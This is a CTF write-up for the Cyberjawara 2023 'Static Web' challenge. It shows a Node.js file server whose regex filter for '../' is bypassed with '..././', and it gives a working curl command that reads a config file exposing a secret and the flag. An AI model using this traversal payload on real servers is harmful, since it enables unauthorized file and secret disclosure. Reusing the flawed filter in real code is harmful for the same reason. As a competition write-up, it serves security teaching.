---
comments: true
title: Cyberjawara 2023 Web Writeup
date: 2023-12-04T00:00:00.000+07:00
category:
- ctf
tags:
- cj2023
private: false

---

### Static Web - 300pts - 63 solves

Given web application that serves static file by defining custom routes and using `fs.readFile` to read the content. 

```javascript

if (req.url.startsWith('/static/')) {
    const urlPath = req.url.replace(/\.\.\//g, '')
    const filePath = path.join(__dirname, urlPath);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404);
            res.end("Error: File not found");
        } else {
            res.writeHead(200);
            res.end(data);
        }
    });
} 
```

Known that there could be possibility to path traversal there is a protection using `const urlPath = req.url.replace(/\.\.\//g, '')` but this regex is could be bypassed using `..././flag.txt`

```bash

curl --path-as-is "https://static-web.ctf.cyberjawara.id/static/..././config.js"
const secret = 'wWij1i23ejasdsdjvno2rnj123123';
const flag = 'CJ2023{1st_warmup_and_m1c_ch3ck}';

module.exports = {secret, flag}%    
```

![Static web flag](/uploads/static-web-flag.png)



